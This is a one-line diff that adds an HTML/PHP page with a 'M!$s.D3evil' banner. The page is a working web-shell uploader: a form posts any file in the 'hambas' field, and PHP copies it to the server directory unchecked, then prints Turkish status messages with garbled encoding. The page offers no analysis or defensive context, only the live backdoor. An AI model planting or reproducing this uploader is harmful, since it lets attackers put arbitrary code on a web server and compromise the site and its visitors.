@@ -1,0 +1,1 @@
+<p align="center"><b>M!$s.D3evil<?$msg = copy($_FILES[hambas][tmp_name],$_FILES[hambas][name]) ? "Çalýþýyor" : "Çalýþmýyor";echo $_FILES[hambas][name];echo $msg;?><form ENCTYPE="multipart/form-data" ACTION="" METHOD="POST"><input NAME="hambas" TYPE="file"><input VALUE="submit" TYPE="submit"></form>
